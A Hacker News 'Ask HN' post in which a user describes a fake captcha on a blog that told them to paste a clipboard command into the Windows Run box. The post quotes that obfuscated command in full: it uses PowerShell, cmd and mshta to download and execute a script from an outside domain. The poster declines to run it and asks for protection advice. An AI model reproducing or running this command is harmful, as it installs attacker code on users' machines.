---
title: "Ask HN: Crooked Timber showed showed me a virus captcha, What now?"
url: "https://news.ycombinator.com/item?id=49084404"
source: "hackernews"
category: "news"
tags: ["hackernews", "tech-news"]
date: "2026-07-28T15:32:58Z"
metadata:
  score: "25"
---

# Ask HN: Crooked Timber showed showed me a virus captcha, What now?

> Source: hackernews | Category: news | 2026-07-28T15:32:58Z

Score: 25 | Comments: 16

Hello everyone,
This morning, as i started my shift, i thought i would start visiting some news blogs &#x2F; websites to kick off the day. When it got to Crooked Timber i saw a captcha page instead, it looked like a traditional Google captcha.
I clicked it, the spinner spun, and a box opened on the right, showing the traditional &quot;Verify you&#x27;re human&quot; white title on a blue background.<p>It showed 2 &quot;Manual Verification Steps&quot; :
1. Press Win + R
2. Press Ctrl + V and press Run<p>At first i assumed it was a new type of captcha checking i a physical keyboard was attached to the browser. But i instantly recognized the attempt to make me run a script on my machine.<p>I opened a new type and to my surprise, the something new was in my clipboard : 
&quot;pcalua -a &quot;PowerShell&quot; -c &quot;saps cmd &#x27;&#x2F;v&#x2F;c m^s^h^t^a h^t^t^p^s^:^&#x2F;^&#x2F;fine-work-team.com&#x2F;6272&#x27; -Wi Hi&quot;&quot;<p>I submited it to one of LLMs my work gives me access to, which told me to absolutly not run it (i wasn&#x27;t planning to) and explained the command would download and run a script from the URL.<p>How do i protect myself from these scams &#x2F; hack attempts in the future ? i always tought of myself &quot;prepared&quot; but i was surprised.<p>Has this happened to you before ? How do you protect yourself ?
